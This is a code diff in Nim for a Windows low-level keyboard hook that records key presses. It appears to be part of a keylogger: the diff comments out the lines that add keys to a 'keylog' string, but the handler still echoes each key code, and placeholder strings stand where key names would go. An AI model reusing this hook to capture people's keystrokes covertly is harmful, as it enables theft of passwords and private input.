@@ -2,7 +2,7 @@ import winim
 
 var eHook: HHOOK
 
-var keylog: string = ""
+# var keylog: string = ""
 
 proc keyboardHandler(nCode: int32, wparam: WPARAM, lparam: LPARAM): LRESULT {.stdcall.} =
   if (nCode == HC_ACTION):
@@ -11,11 +11,11 @@ proc keyboardHandler(nCode: int32, wparam: WPARAM, lparam: LPARAM): LRESULT {.st
 
     if wparam == WM_KEYDOWN or wparam == WM_SYSKEYDOWN:
       echo kbs.vkCode
-      keylog.add "sal cf" # Keys::KEYS[kbs->vkCode].Name;
+      # keylog.add "sal cf" # Keys::KEYS[kbs->vkCode].Name;
 
       if (kbs.vkCode == VK_RETURN):
-        keylog.add '\n'
-
+        # keylog.add '\n'
+        discard
     elif wparam == WM_KEYUP or wparam == WM_SYSKEYUP: # if key state is
     # released, used for
     # sys keys like SHIFT
@@ -27,7 +27,7 @@ proc keyboardHandler(nCode: int32, wparam: WPARAM, lparam: LPARAM): LRESULT {.st
           key == VK_RWIN:
         var KeyName = "abi" # Keys::KEYS[kbs->vkCode].Name # translate key to human friendly name
         KeyName.insert("/", 1) # insert like [SHIFT] [a] [b] [/SHIFT]
-        keylog.add KeyName
+        # keylog.add KeyName
 
   result = CallNextHookEx(eHook, nCode, wparam, lparam)
 
